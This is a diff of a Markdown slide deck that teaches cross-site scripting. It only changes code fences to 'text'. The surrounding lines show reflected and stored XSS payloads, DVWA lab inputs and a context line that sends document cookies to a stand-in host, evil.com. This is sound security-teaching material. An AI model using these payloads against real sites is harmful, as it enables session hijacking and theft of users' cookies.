@@ -14,7 +14,7 @@ paginate: true
 
 `Cross-Site Scripting` (`XSS`) occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute scripts in the victim's browser.
 
-```
+```text
 +----------+     Malicious script     +----------+
 | Attacker | -----------------------> | Web App  |
 +----------+   (stored or reflected)  +----+-----+
@@ -43,7 +43,7 @@ paginate: true
 
 ## Reflected XSS
 
-```
+```text
 Attack flow:
 1. Attacker crafts URL with malicious script:
    https://target.com/search?q=<script>alert('XSS')</script>
@@ -88,7 +88,7 @@ Response: <h2>Search results for: <script>document.location='https://evil.com/?c
 
 ## Stored XSS
 
-```
+```text
 Attack flow:
 1. Attacker posts malicious content:
    Comment: "Great product! <script>steal_cookies()</script>"
@@ -156,7 +156,7 @@ document.getElementById('output').textContent = userInput;
 
 ## DOM XSS Sources and Sinks
 
-```
+```text
 Sources (where attacker input enters):
   document.URL
   document.documentURI
@@ -305,7 +305,7 @@ document.body.innerHTML = `
 
 ## XSS Delivery Mechanisms
 
-```
+```text
 1. Reflected XSS via URL:
    https://target.com/search?q=<script>evil()</script>
    - Sent via email, chat, social media
@@ -332,7 +332,7 @@ document.body.innerHTML = `
 
 ## Finding XSS - Manual Testing
 
-```
+```text
 Step 1: Identify all reflection points
   Enter: unique_string_12345
   Search page source for this string
@@ -525,7 +525,7 @@ safe_url = quote(user_input)
 
 ## XSS Prevention - Complete Strategy
 
-```
+```text
 1. Output Encoding (primary defense)
    - Context-aware encoding at point of output
    - Use framework auto-escaping features
@@ -695,7 +695,7 @@ cat urls.txt | dalfox pipe
 
 ## XSS Impact - Real-World Consequences
 
-```
+```text
 XSS attacks can achieve:
 
 1. Session Hijacking
@@ -727,7 +727,7 @@ XSS attacks can achieve:
 
 ## XSS Testing Methodology Summary
 
-```
+```text
 For each input field / parameter:
 
 1. IDENTIFY the reflection point
@@ -766,7 +766,7 @@ For each input field / parameter:
 
 ## Lab: DVWA XSS Exercises
 
-```
+```text
 Reflected XSS (Low):
   URL: /vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
 
